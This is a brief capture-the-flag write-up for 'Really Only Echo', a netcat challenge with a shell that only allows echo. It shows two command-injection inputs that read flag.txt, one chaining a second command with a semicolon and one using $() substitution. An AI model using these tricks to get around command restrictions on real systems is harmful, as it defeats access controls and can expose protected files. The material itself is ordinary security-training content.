# Really Only Echo

Hey, I have made a terminal that only uses echo, can you find the flag?

`nc chal.competitivecyber.club 3333`

## Solution

`echo HELLO; /bin/cat flag.txt`

`echo $(/usr/bin/cat flag.txt)`

really should have tried this one, looked super easy...
